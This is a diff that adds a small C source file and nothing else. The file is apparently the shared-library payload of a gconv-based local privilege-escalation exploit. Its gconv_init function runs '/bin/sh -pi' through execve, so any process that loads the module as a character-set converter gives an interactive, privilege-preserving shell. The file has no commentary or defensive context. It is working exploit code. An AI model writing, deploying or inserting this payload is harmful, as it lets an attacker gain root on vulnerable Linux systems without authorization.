@@ -1,0 +1,14 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void gconv(void) {
+}
+
+void gconv_init(void *step)
+{
+	char * const args[] = { "/bin/sh", "-pi", NULL };
+	char * const environ[] = { "PATH=/bin:/usr/bin", NULL };
+	execve(args[0], args, environ);
+	exit(0);
+}
